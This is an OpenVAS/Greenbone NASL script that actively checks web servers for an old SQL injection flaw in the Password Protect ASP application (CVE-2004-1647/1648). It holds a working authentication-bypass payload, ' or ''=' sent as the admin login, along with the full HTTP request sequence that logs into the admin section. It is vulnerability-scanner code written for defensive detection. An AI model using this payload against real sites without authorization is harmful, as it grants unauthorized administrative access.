# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14587");
  script_version("2024-11-22T05:05:35+0000");
  script_tag(name:"last_modification", value:"2024-11-22 05:05:35 +0000 (Fri, 22 Nov 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1647", "CVE-2004-1648");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Password Protect SQLi Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121162308/http://www.securityfocus.com/bid/11073");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210119082626/https://www.securityfocus.com/archive/1/373901");

  script_tag(name:"summary", value:"Password Protect is prone to a SQL injection (SQLi)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST and HTTP GET requests and
  checks the responses.");

  script_tag(name:"impact", value:"The flaw allows remote attackers to inject arbitrary SQL
  statements into the remote database and to gain administrative access on this service.");

  script_tag(name:"solution", value:"Update to the latest version of this software.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_asp( port:port ) )
  exit( 0 );

host = http_host_name( port:port );
useragent = http_get_user_agent();

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/adminSection/main.asp";
  res = http_get_cache( item:url, port:port );
  if( ! res || res !~ "Set-Cookie\s*:.+" )
    continue;

  # nb: Need to "grab" a "fresh" Cookie...
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  v = eregmatch( pattern:"[Ss]et-[Cc]ookie\s*: *([^; \t\r\n]+)", string:res );
  if( isnull( v ) )
    continue; # Cookie is not available

  cookie = v[1];

  req = string( "POST ", dir, "/adminSection/index_next.asp HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: */*\r\n",
                "Connection: close\r\n",
                "Cookie: ", cookie, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 57\r\n",
                "\r\n",
                "admin=%27+or+%27%27%3D%27&Pass=password&BTNSUBMIT=+Login+\r\n" );
  res = http_keepalive_send_recv( port:port, data:req );

  req = string( "GET ", dir, "/adminSection/main.asp HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: */*\r\n",
                "Connection: close\r\n",
                "Cookie: ", cookie, "\r\n",
                "\r\n" );
  res = http_keepalive_send_recv( port:port, data:req );

  if( "Web Site Administration" >< res && "The Web Animations Administration Section" >< res ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
